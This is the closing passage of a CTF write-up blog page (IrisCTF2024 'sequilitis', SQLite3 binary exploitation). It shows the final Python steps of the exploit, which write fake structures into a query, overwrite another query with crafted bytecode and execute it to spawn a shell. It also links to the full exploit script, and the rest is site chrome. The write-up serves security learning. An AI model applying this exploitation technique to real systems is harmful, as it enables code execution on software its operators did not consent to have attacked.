</div><p>Now that we have the fake structures ready, we will write them into memory by editing a query (1). Then, we&rsquo;ll make another query (2) to overwrite it with a function call, and subsequently execute it.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">edit_query</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="n">payload</span><span class="p">)</span>
<span class="n">new_query</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;SELECT 1.0&#34;</span><span class="p">)</span>
<span class="n">bytecode</span> <span class="o">=</span> <span class="n">generate_opcode</span><span class="p">(</span><span class="mi">66</span><span class="p">,</span> <span class="mi">241</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">ptr1</span><span class="p">)</span>
<span class="n">edit_query</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">bytecode</span><span class="p">),</span> <span class="n">bytecode</span><span class="p">)</span>
<span class="n">exec_query</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><p>This should spawn us a shell!</p>
<p><img src="/IrisCTF2024/img2.png"
	
	
	
	loading="lazy"
	
	
></p>
<p>You can find challenge files and exploit script <a class="link" href="https://github.com/SanjayVardhan/pwn/tree/main/Origin/CTFs/IrisCTF2024/sequilitis"  target="_blank" rel="noopener"
    >here</a></p>

</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/irisctf2024/">IrisCTF2024</a>
        
            <a href="/tags/sqlite3/">Sqlite3</a>
        
            <a href="/tags/binary-exploitation/">Binary Exploitation</a>
        
    </section>


    </footer>


    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">Related content</h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="">
    <a href="/posts/bi0sctf22-n0tes/">
        
        

        <div class="article-details">
            <h2 class="article-title">bi0sCTF22 - n0tes</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    

    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2020 - 
        
        2024 spektre
    </section>
    
    <section class="powerby">
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.21.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
